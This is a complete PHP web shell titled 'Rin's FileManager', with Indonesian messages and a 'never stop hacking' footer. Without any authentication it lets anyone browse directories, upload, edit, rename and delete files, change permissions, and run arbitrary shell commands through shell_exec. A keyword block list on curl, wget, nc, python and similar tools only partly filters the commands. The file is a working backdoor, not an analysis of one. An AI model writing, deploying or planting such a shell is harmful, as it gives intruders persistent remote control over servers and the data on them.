<?php
@error_reporting(0);

if (isset($_GET['d'])) chdir($_GET['d']);
$pwd = getcwd();
$list = scandir($pwd);

if ($_FILES['f']) {
  $tmp = $_FILES['f']['tmp_name'];
  $name = basename($_FILES['f']['name']);
  $dest = $pwd . "/" . preg_replace('/[^a-zA-Z0-9_\.-]/', '_', $name);
  if (move_uploaded_file($tmp, $dest)) echo "<b>Upload sukses:</b> $name<br>";
  else echo "<b>Gagal upload!</b><br>";
}

if ($_POST['a'] === 'rename') rename($_POST['src'], $_POST['dst']);
if ($_POST['a'] === 'edit') file_put_contents($_POST['src'], $_POST['dat']);
if ($_POST['a'] === 'mkdir') {
  $name = basename($_POST['folder']);
  $dir = $pwd . '/' . preg_replace('/[^a-zA-Z0-9_\.-]/', '_', $name);
  if (!is_dir($dir)) mkdir($dir);
}
if ($_POST['a'] === 'mkfile') {
  $name = basename($_POST['file']);
  $file = $pwd . '/' . preg_replace('/[^a-zA-Z0-9_\.-]/', '_', $name);
  if (!file_exists($file)) file_put_contents($file, '');
}
if ($_POST['a'] === 'chmod') chmod($_POST['src'], octdec($_POST['perm']));
if (isset($_GET['del'])) unlink($_GET['del']);

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Rin FileManager</title>
<style>
body{background:#111;color:#0f0;font-family:monospace}
a{color:#0ff;text-decoration:none}
table{width:100%;border-collapse:collapse}
td,th{border:1px solid #333;padding:5px}
input,textarea{background:#222;color:#0f0;border:1px solid #444}
h1{color:#0ff}
footer{margin-top:20px;text-align:center;color:#555}
pre{background:#000;padding:10px;border:1px solid #444;color:#0f0;white-space:pre-wrap}
</style></head><body>";

echo "<h1 style='display:flex;align-items:center;gap:10px'>
<span style='font-size:24px'>&#128187;</span> Rin's FileManager
</h1>";

echo "<h3>Dir: $pwd</h3>
<form method=POST enctype='multipart/form-data'>
<input type=file name=f><input type=submit value='Upload'></form><br>

<form method='POST'>
<input type='hidden' name='a' value='mkdir'>
<input type='text' name='folder' placeholder='Folder name'>
<input type='submit' value='Add Folder'>
</form><br>

<form method='POST'>
<input type='hidden' name='a' value='mkfile'>
<input type='text' name='file' placeholder='Filename.txt'>
<input type='submit' value='Add File'>
</form><br>";

echo "<table><tr><th>Name</th><th>Size</th><th>Action</th></tr>";
foreach ($list as $f) {
  if ($f === '.') continue;
  $path = $pwd . '/' . $f;
  $size = is_dir($path) ? '[DIR]' : filesize($path);
  $link = is_dir($path) ? "?d=$path" : "#";
  echo "<tr><td><a href='$link'>$f</a></td><td>$size</td><td>
  <a href='?del=$path'>Del</a> |
  <a href='?r=$path'>Rename</a> |
  <a href='?e=$path'>Edit</a> |
  <a href='?c=$path'>Chmod</a></td></tr>";
}
echo "</table>";

if (isset($_GET['r'])) {
  $f = $_GET['r'];
  echo "<h4>Rename</h4><form method=POST>
  <input type=hidden name=a value='rename'>
  <input type=text name=src value='$f'>
  <input type=text name=dst value='$f'>
  <input type=submit value='Rename'></form>";
}
if (isset($_GET['e']) && is_file($_GET['e'])) {
  $f = $_GET['e'];
  $data = htmlspecialchars(@file_get_contents($f));
  echo "<h4>Edit</h4><form method=POST>
  <input type=hidden name=a value='edit'>
  <input type=text name=src value='$f'><br>
  <textarea name=dat rows=10 cols=80>$data</textarea><br>
  <input type=submit value='Save'></form>";
}
if (isset($_GET['c'])) {
  $f = $_GET['c'];
  echo "<h4>Chmod</h4><form method=POST>
  <input type=hidden name=a value='chmod'>
  <input type=text name=src value='$f'>
  <input type=text name=perm placeholder='0777'>
  <input type=submit value='Apply'></form>";
}

echo "<h3>Terminal</h3>
<form method='POST'>
<input type='hidden' name='a' value='cmd'>
<input type='text' name='cmd' placeholder='ls -la' style='width:80%'>
<input type='submit' value='Exec'>
</form>";

if ($_POST['a'] === 'cmd') {
  $cmd = $_POST['cmd'];
  if (preg_match('/(curl|wget|rm|base64|nc|python|php|perl|reboot|shutdown|passwd)/i', $cmd)) {
    $output = 'Perintah diblokir oleh anti-WAF.';
  } else {
    $raw = @shell_exec($cmd);
    $output = htmlspecialchars(substr($raw, 0, 3000));
    usleep(100000);
  }
  echo "<pre>$output</pre>";
}

echo "<footer><hr><small>
<span style='font-size:16px'>&#128187;</span> Made with <span style='color:#f66'>&lt;3</span> by Rin & Guru<br>
<i>never stop hacking</i>
</small></footer></body></html>";
?>
